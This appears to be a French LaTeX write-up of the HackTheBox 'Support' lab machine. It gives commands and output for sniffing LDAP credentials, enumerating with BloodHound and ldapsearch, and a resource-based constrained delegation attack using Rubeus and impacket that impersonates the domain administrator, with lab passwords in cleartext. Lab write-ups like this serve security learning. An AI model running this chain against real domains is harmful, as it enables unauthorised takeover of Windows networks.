\chapter{Support}

\begin{itemize}
    \item {\bf keywords}: \gls{t:resource-based-constrained-delegation}
    \item {\bf Components}: \gls{ldap} 
    \item {\bf tools}: mono,wireshark, bloodhound,ldapsearch, Rubeus, impacket,
evil-winrm, enum4linux-ng
\end{itemize}

\section{Résumé}
\section{Détails}


un coup de nmap et cela sent le \verb+DC+. port \verb+smb+ ouvert et \verb+dns+

\verb+enum4linux-ng -S -u anonymous IP+ donne les infos sur la target et les shares.

Dans \verb+setspn -S toto/dc.support.htb dc+ on trouve un soft prometteur

\verb+mono UserInfo.exe find -first test+ on chope une exception de connexion.
Il faut ajouter dans \verb+/etc/hosts+ le serveur.

capture du traffic ldap (\verb+tcp port 389+) avec wireshark. Après on applique
une recherche des packets contenant la chaine \verb+bindRequest+ dans le
\verb+Packet details+ (\verb+Edit/Find Packet...+)


On peut alors lire:
\begin{verbatim}
LDAPMessage bindRequest(1) "support\ldap" simple
    messageID: 1
    protocolOp: bindRequest (0)
        bindRequest
            version: 3
            name: support\ldap
            authentication: simple (0)
                simple: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
    [Response In: 5]
\end{verbatim}

donc on a le user et le password

On peut aussi voir que la connexion est un success sur la \verb+bindResponse+


un coup de bloodhound :
\begin{verbatim}
bloodhound-python -u 'ldap@support.htb' \ 
 -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.10.11.174 -d support.htb -c all
\end{verbatim}

avec bloodhound on constate que l'utilisateur \verb+support@support.htb+:
\begin{itemize}
    \item GenericAll sur le dc via le groupe
    \item canPSRemote sur le dc (Shortest Path to Unconstrained Delegation
        Systems)
\end{itemize}

je n'arrive pas à faire marcher le \verb+UserInfo+ correctement pour choper les
infos de l'utilisateur donc un coup de \verb+ldapsearch+

\begin{verbatim}
ldapsearch -x -H ldap://10.10.11.174 -D 'SUPPORT\ldap' \
    -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
    -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.tx
\end{verbatim}


on obtient le mdp dans le
champ \verb+info: Ironside47pleasure40Watchful+



\begin{verbatim}
evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'

$fake="PWN"
$target = "DC"
$passwd = ConvertTo-SecureString '123456' -AsPlainText -Force

New-MachineAccount -MachineAccount $fake -Password $passwd -verbose
Set-ADComputer $target -PrincipalsAllowedToDelegateToAccount ($fake + '$')

setspn -S toto/dc.support.htb dc


Rubeus.exe hash /password:123456 /user:PWN$ /domain:support.htb

[*] Input password             : 123456
[*] Input username             : PWN$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostpwn.support.htb
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 5AB3ABAAE1DE2BF58CC55F5F5F5630A6
[*]       aes256_cts_hmac_sha1 : 9BC0365053251EFDFA66E0202A5140F64914B0B85BC7F1775C83FBA56660A79D
[*]       des_cbc_md5          : 4FDF1F94E64F5B52
\end{verbatim}


\begin{verbatim}
getST.py support.htb/PWN \
    -dc-ip dc.support.htb \
    -impersonate administrator \
    -spn toto/dc.support.htb \
    -aesKey 9BC0365053251EFDFA66E0202A5140F64914B0B85BC7F1775C83FBA56660A79D

export KRB5CCNAME=administrator.ccache

psexec.py support.htb/administrator@dc.support.htb -no-pass -k
whoami
\end{verbatim}


